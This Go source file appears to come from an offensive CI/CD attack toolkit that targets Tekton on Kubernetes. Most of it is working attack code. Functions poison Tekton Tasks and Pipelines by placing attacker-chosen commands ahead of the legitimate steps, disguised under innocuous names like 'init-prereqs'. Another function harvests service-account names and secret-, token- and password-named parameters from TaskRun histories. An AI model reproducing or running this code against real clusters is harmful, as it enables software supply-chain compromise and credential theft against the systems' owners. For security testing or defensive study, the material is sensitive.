package cicd

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
)

var (
	tektonTaskGVR = schema.GroupVersionResource{
		Group: "tekton.dev", Version: "v1", Resource: "tasks",
	}
	tektonPipelineGVR = schema.GroupVersionResource{
		Group: "tekton.dev", Version: "v1", Resource: "pipelines",
	}
	tektonTaskRunGVR = schema.GroupVersionResource{
		Group: "tekton.dev", Version: "v1", Resource: "taskruns",
	}
)

// PoisonTektonTask injects a malicious init step into a Tekton Task that executes before legitimate steps.
func PoisonTektonTask(ctx context.Context, dynClient dynamic.Interface, ns, taskName, image, command string) (*PoisonResult, error) {
	result := &PoisonResult{
		Platform: "tekton",
		Action:   "poison_task",
		Target:   taskName,
	}

	task, err := dynClient.Resource(tektonTaskGVR).Namespace(ns).Get(ctx, taskName, metav1.GetOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("failed to get task: %v", err)
		return result, nil
	}

	spec, found, err := unstructured.NestedMap(task.Object, "spec")
	if err != nil || !found {
		result.Output = "task has no spec"
		return result, nil
	}

	steps, found, err := unstructured.NestedSlice(spec, "steps")
	if err != nil || !found {
		steps = []any{}
	}

	poisonStep := map[string]any{
		"name":   "init-prereqs",
		"image":  image,
		"script": command,
	}

	steps = append([]any{poisonStep}, steps...)

	if err := unstructured.SetNestedSlice(task.Object, steps, "spec", "steps"); err != nil {
		result.Output = fmt.Sprintf("failed to set steps: %v", err)
		return result, nil
	}

	_, err = dynClient.Resource(tektonTaskGVR).Namespace(ns).Update(ctx, task, metav1.UpdateOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("update failed: %v", err)
		return result, nil
	}

	result.Success = true
	result.Output = fmt.Sprintf("injected step 'init-prereqs' into task %s", taskName)
	return result, nil
}

// PoisonTektonPipeline injects a malicious task at the beginning of a Tekton Pipeline definition.
func PoisonTektonPipeline(ctx context.Context, dynClient dynamic.Interface, ns, pipelineName, image, command string) (*PoisonResult, error) {
	result := &PoisonResult{
		Platform: "tekton",
		Action:   "poison_pipeline",
		Target:   pipelineName,
	}

	pipeline, err := dynClient.Resource(tektonPipelineGVR).Namespace(ns).Get(ctx, pipelineName, metav1.GetOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("failed to get pipeline: %v", err)
		return result, nil
	}

	tasks, found, err := unstructured.NestedSlice(pipeline.Object, "spec", "tasks")
	if err != nil || !found {
		result.Output = "pipeline has no tasks"
		return result, nil
	}

	poisonTask := map[string]any{
		"name": "prereq-check",
		"taskSpec": map[string]any{
			"steps": []any{
				map[string]any{
					"name":   "run",
					"image":  image,
					"script": command,
				},
			},
		},
	}

	tasks = append([]any{poisonTask}, tasks...)

	if err := unstructured.SetNestedSlice(pipeline.Object, tasks, "spec", "tasks"); err != nil {
		result.Output = fmt.Sprintf("failed to set tasks: %v", err)
		return result, nil
	}

	_, err = dynClient.Resource(tektonPipelineGVR).Namespace(ns).Update(ctx, pipeline, metav1.UpdateOptions{})
	if err != nil {
		result.Output = fmt.Sprintf("update failed: %v", err)
		return result, nil
	}

	result.Success = true
	result.Output = fmt.Sprintf("injected task 'prereq-check' into pipeline %s", pipelineName)
	return result, nil
}

// ListTektonResources enumerates Tasks, Pipelines, and TaskRuns in the given namespace.
func ListTektonResources(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
	var sb strings.Builder

	tasks, err := ListCRDs(ctx, dynClient, tektonTaskGVR, ns)
	if err == nil {
		fmt.Fprintf(&sb, "Tasks (%d):\n", len(tasks))
		for _, t := range tasks {
			fmt.Fprintf(&sb, "  - %s\n", t.GetName())
		}
	}

	pipelines, err := ListCRDs(ctx, dynClient, tektonPipelineGVR, ns)
	if err == nil {
		fmt.Fprintf(&sb, "Pipelines (%d):\n", len(pipelines))
		for _, p := range pipelines {
			fmt.Fprintf(&sb, "  - %s\n", p.GetName())
		}
	}

	runs, err := ListCRDs(ctx, dynClient, tektonTaskRunGVR, ns)
	if err == nil {
		fmt.Fprintf(&sb, "TaskRuns (%d):\n", len(runs))
		for _, r := range runs {
			status, _, _ := unstructured.NestedString(r.Object, "status", "conditions", "0", "reason")
			fmt.Fprintf(&sb, "  - %s (status=%s)\n", r.GetName(), status)
		}
	}

	return sb.String(), nil
}

// StealTektonSecrets extracts service account tokens and sensitive parameters from TaskRun histories.
func StealTektonSecrets(ctx context.Context, dynClient dynamic.Interface, ns string) (string, error) {
	runs, err := ListCRDs(ctx, dynClient, tektonTaskRunGVR, ns)
	if err != nil {
		return "", err
	}

	var sb strings.Builder
	sb.WriteString("Tekton TaskRun Credentials:\n")

	for _, r := range runs {
		podName, _, _ := unstructured.NestedString(r.Object, "status", "podName")
		serviceAccount, _, _ := unstructured.NestedString(r.Object, "spec", "serviceAccountName")

		if podName != "" || serviceAccount != "" {
			fmt.Fprintf(&sb, "  Run: %s\n", r.GetName())
			if podName != "" {
				fmt.Fprintf(&sb, "    Pod: %s\n", podName)
			}
			if serviceAccount != "" {
				fmt.Fprintf(&sb, "    ServiceAccount: %s\n", serviceAccount)
			}
		}

		params, found, _ := unstructured.NestedSlice(r.Object, "spec", "params")
		if found {
			for _, param := range params {
				if p, ok := param.(map[string]any); ok {
					name, _ := p["name"].(string)
					if containsSensitive(name) {
						val, _ := json.Marshal(p["value"])
						fmt.Fprintf(&sb, "    Param[%s]: %s\n", name, string(val))
					}
				}
			}
		}
	}

	return sb.String(), nil
}

func containsSensitive(name string) bool {
	lower := strings.ToLower(name)
	keywords := []string{"secret", "token", "password", "key", "cred", "auth"}
	for _, kw := range keywords {
		if strings.Contains(lower, kw) {
			return true
		}
	}
	return false
}
